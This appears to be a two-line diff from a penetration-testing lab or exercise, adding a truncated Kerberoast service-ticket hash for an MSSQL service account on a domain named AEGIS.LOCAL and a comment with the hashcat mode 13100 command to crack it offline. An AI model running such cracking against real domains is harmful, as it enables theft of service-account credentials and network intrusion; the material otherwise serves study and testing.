@@ -1,0 +1,2 @@
+$krb5tgs$23$*svc_mssql$AEGIS.LOCAL$MSSQLSvc/db01.aegis.local:1433*$99281a4b10...$0912aebc
+# Hashcat mode 13100 : hashcat -m 13100 kerberoast_spns.txt wordlist.txt
